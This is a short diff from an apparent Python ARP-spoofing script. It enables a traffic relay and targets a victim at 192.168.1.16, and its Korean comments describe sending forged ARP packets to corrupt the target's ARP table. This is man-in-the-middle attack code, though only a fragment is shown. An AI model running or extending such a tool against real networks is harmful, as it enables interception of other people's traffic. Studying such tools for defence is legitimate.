@@ -361,8 +361,8 @@ def main():
     arp = ARP(victim='192.168.1.16')
 
     # 리눅스 상의 Relay를 사용하므로,
-    # r = Relay(arp)
-    # r.run()
+    r = Relay(arp)
+    r.run()
 
     # target에 변조된 ARP 패킷을 보냄
     # target의 arp-table 을 변조
